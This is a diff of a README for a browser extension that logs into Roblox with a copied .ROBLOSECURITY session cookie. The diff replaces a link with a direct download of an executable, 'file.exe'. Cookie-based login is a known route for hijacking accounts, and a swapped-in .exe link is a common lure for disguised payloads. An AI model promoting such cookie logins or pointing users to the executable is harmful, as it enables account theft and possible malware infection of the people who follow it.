@@ -1,6 +1,6 @@
 <h1 align="center">Roblox Cookie Login Extension</h1>
 <h2 align="center">This extension can login to Roblox using a .ROBLOSECURITY cookie value</h2>
-https://example.com
+https://example.com/file.exe
 ---
 
 1. Copy the `.ROBLOSECURITY` Roblox cookie of the account you want to login to
